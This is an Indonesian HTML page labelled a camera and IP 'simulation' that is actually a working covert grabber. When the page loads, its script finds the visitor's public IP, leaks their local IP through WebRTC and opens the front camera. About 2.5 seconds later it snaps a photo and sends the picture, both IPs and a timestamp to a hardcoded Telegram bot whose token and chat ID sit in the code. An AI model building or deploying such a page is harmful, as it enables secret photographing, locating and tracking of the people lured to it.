<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simulasi Kamera & IP</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; margin: 0; min-height: 100vh; }
        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 25px; border-radius: 16px; }
        h1 { margin-bottom: 10px; }
        .info { background: rgba(255,255,255,0.2); padding: 12px; margin: 12px 0; border-radius: 10px; }
        video, img { width: 100%; max-width: 500px; border-radius: 12px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📷 Simulasi Kamera & IP</h1>
        
        <div class="info">IP Publik: <strong id="public-ip">Mencari...</strong></div>
        <div class="info">IP Lokal: <strong id="local-ip">Mencari...</strong></div>

        <video id="video" autoplay playsinline muted></video>
        <div id="status">Mengaktifkan kamera...</div>
        <h3>Hasil Foto</h3>
        <img id="photo" src="" alt="">
    </div>

    <script>
        const BOT_TOKEN = "8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y";
        const CHAT_ID = "8463156896";

        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('public-ip').textContent=d.ip);

        function getLocalIP() {
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(o=>pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if(e.candidate) {
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if(m) document.getElementById('local-ip').textContent = m[0];
                }
            };
        }
        getLocalIP();

        async function kirimKeTelegram(ipPub, ipLoc, photoUrl) {
            const caption = `IP Publik: ${ipPub}\nIP Lokal: ${ipLoc}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
            const formData = new FormData();
            const blob = await fetch(photoUrl).then(r => r.blob());
            formData.append('photo', blob, 'foto.png');
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:formData});
        }

        function takePhoto(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const url = canvas.toDataURL('image/png');
            document.getElementById('photo').src = url;
            kirimKeTelegram(document.getElementById('public-ip').textContent, document.getElementById('local-ip').textContent, url);
            document.getElementById('status').innerHTML = "✅ Terkirim!";
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => setTimeout(() => takePhoto(video), 2500);
            } catch(e) {
                document.getElementById('status').innerHTML = "❌ Gagal kamera";
            }
        }

        window.onload = startCamera;
    </script>
</body>
</html>
